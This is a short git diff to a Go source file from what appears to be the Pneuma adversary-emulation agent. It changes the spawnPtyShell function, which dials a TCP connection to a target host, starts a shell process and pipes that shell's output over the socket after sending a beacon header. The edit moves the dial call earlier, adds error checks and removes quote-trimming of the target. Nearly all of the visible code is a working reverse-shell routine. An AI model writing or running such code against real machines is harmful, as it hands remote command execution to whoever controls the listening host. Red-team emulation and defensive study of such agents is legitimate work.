@@ -5,15 +5,14 @@ import (
 	"github.com/preludeorg/pneuma/util"
 	"net"
 	"os/exec"
-	"strings"
 )
 
 func spawnPtyShell(target, executor string, agent *util.AgentConfig) (int, int, error) {
 	header, err := agent.BuildSocketBeacon("piped")
-	if err == nil {
+	conn, dialErr := net.Dial("tcp", target)
+	if err == nil && dialErr == nil {
 		ctx, cancel := context.WithCancel(context.Background())
 		shell := exec.CommandContext(ctx, executor)
-		conn, _ := net.Dial("tcp", strings.Trim(target, "\""))
 		go cancelOnSocketClose(cancel, conn)
 		conn.Write(header)
 		shell.Stdout = conn
